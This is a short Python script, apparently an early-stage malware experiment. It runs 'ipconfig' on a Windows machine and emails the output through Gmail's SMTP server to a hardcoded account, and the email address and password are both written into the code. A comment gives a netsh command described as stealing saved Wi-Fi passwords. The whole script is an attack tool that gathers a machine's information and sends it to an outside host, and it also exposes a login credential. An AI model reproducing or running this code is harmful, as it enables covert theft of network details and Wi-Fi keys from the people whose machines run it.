
import subprocess, smtplib


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

#Windows command to steal wifi passwords:
# netsh wlan show profile <profile> key=clear
subject = "ipconfig info"
command = "ipconfig"
output = subprocess.check_output(command,shell=True)
send_mail("emailmalwaretester@gmail.com","#$zKeK*8U4Q!V$7y",output)